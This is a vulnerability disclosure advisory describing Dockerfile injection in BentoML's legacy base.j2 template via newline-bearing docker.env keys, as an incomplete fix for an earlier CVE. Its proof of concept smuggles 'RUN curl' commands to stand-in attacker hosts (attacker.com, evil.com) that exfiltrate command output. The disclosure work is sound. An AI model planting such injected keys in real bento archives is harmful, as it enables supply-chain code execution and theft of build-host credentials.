Reported via email on 2 June 2026 - no response.

Reported to Huntr on 7 June 2026 (https://huntr.com/bounties/39197b4a-065f-4cc6-a90a-be3333ded3b3) - no response.


# Dockerfile injection via docker.env dict keys in base.j2 template (incomplete fix for CVE-2026-44346) in bentoml/bentoml

https://github.com/bentoml/BentoML

BentoML's legacy Dockerfile generation template base.j2 renders docker.env dictionary keys without any sanitization. A malicious bento archive or bentofile.yaml with a newline character in a docker.env dict key injects arbitrary Dockerfile instructions, leading to remote code execution on the host running "bentoml containerize". This is an incomplete fix of CVE-2026-44346 (GHSA-w2pm-x38x-jp44), which patched the BentoEnvSchema.name path in the new SDK but left the docker.env dict-key path in the legacy template unsanitized.

## Details
CVE-2026-44346 (GHSA-w2pm-x38x-jp44, patched in 1.4.39) fixed Dockerfile injection in the base_v2.j2 template by applying normalize_line to environment variable names rendered via the new BentoEnvSchema list (envs[*].name). The base_v2.j2 template now correctly uses:

ARG {{ env.name|normalize_line }}

However, the legacy base.j2 template (src/bentoml/_internal/container/frontend/dockerfile/templates/base.j2, lines 45-48) renders the docker.env dictionary directly without any filter on the key:

{% if __options__env is not none %} {% for key, value in __options__env.items() -%} ARG {{ key }}={{ value }} ENV {{ key }}=${{ key }} {% endfor %}

The __options__env variable originates from DockerOptions.env (src/bentoml/_internal/bento/build_config.py, line 170). When provided as a Python dict (bentofile.yaml using a mapping rather than a list), the converter at lines 138-140 performs no validation:

if isinstance(env, dict): return {str(k): str(v) for k, v in env.items()}

A key containing a newline character is passed directly into the Jinja2 template. Since the template renders key in the position of a Dockerfile ARG directive, the newline breaks out of the ARG instruction and introduces new Dockerfile lines.

The Jinja2 environment used for base.j2 is a SandboxedEnvironment, so Python-level code execution via the template engine is not possible. The injection instead targets the generated Dockerfile, causing RUN commands to execute during docker build on the host running "bentoml containerize".

The base.j2 template is selected (generate_containerfile in src/bentoml/_internal/container/generate.py, line 191) when docker.base_image is set in the bento configuration.

Proof that the injection is possible:

Input dict key: "FOO\nRUN curl http://attacker.com/$(id)" Generated Dockerfile lines: ARG FOO RUN curl http://attacker.com/$(id)=value ENV FOO RUN curl http://attacker.com/$(id)=$FOO RUN curl http://attacker.com/$(id)

Three separate RUN instructions are injected, each executing arbitrary shell commands on the build host.

Correctly patched path (base_v2.j2, line 70): ARG {{ env.name|normalize_line }} normalize_line: " ".join(s.strip().split()) -- collapses all whitespace including newlines.

Unpatched path (base.j2, line 47): ARG {{ key }}={{ value }} No filter applied to key.

## PoC

Prerequisites:

Victim runs "bentoml containerize" on a bento that was built with a malicious bentofile.yaml or imported from a malicious bento archive
Docker must be available on the build host
Step 1 -- Create a malicious bentofile.yaml with an injected docker.env key:

service: service:MyService docker: base_image: "python:3.11-slim" env: "HARMLESS_VAR\nRUN curl http://attacker.com/rce?data=$(id)": "somevalue"

Step 2 -- Build the bento:

bentoml build

Step 3 -- Victim containerizes the bento (the attack triggers here):

bentoml containerize myservice:latest

During Docker image generation, generate_containerfile() renders base.j2 with the injected key. The generated Dockerfile contains:

ARG HARMLESS_VAR RUN curl http://attacker.com/rce?data=$(id)=somevalue ENV HARMLESS_VAR RUN curl http://attacker.com/rce?data=$(id)=$HARMLESS_VAR RUN curl http://attacker.com/rce?data=$(id)

When Docker executes the build, the RUN instructions run on the host (not in a container at this point), causing code execution with the permissions of the Docker daemon user.

Python reproduction of the injection (no Docker required):

```
from jinja2.sandbox import SandboxedEnvironment
  tmpl_str = '''
  {% for key, value in __options__env.items() -%}
  ARG {{ key }}={{ value }}
  ENV {{ key }}=${{ key }}
  {% endfor %}'''
  env = SandboxedEnvironment()
  tmpl = env.from_string(tmpl_str)
  result = tmpl.render(**{'__options__env': {'FOO\nRUN curl http://evil.com': 'bar'}})
  print(result)
  # Output:
  # ARG FOO
  # RUN curl http://evil.com=bar
  # ENV FOO
  # RUN curl http://evil.com=$FOO
  # RUN curl http://evil.com
```

## Impact
An attacker who can distribute a malicious bento archive or convince a developer to use a malicious bentofile.yaml can achieve remote code execution on the build host when the victim runs "bentoml containerize". The build host typically has access to private container registries, CI/CD secrets, and deployment credentials. This is a supply-chain attack.

This is the same attack class as CVE-2026-44346 (GHSA-w2pm-x38x-jp44) and CVE-2026-33744. The fix for CVE-2026-44346 patched the new SDK BentoEnvSchema path in base_v2.j2 but did not apply the equivalent fix to the docker.env dict-key path rendered in the legacy base.j2 template.
